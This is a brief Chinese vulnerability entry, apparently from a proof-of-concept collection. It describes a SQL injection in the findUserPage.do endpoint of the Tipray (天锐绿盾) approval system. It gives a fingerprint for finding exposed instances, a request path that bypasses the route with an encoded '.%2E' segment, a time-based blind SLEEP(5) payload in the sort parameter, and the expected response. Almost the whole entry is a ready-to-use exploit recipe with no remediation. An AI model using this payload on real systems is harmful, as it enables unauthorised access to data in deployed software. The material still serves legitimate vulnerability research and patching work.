# 天锐绿盾审批系统findUserPage.do存在SQL注入漏洞

天锐绿盾 ｜ SQL注入 ｜ —
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/service/.%2E/user/findUserPage.do HTTP/1.1`

**Payload**
```
sort=(SELECT * FROM (SELECT(SLEEP(5)))x)
```
- **响应特征**：200